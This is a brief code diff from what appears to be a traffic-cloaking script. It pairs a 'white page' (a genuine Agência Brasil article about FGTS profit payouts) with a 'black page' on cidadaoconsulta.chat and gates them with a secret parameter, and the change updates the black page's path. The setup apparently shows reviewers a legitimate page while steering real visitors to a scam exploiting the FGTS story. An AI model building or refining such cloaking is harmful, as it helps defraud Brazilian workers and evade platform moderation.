@@ -8,7 +8,7 @@ const whitePage =
   process.env.WHITE_PAGE ||
   "https://agenciabrasil.ebc.com.br/radioagencia-nacional/economia/audio/2024-08/trabalhadores-vao-receber-parte-do-lucro-de-r-152-bilhoes-do-fgts";
 const blackPage =
-  process.env.BLACK_PAGE || "https://www.cidadaoconsulta.chat/etapa1/";
+  process.env.BLACK_PAGE || "https://www.cidadaoconsulta.chat/chat/";
 
 // Parâmetros de segurança
 const securityParamName = process.env.SECURITY_PARAM_NAME || "JS1CLdcHVbKA";
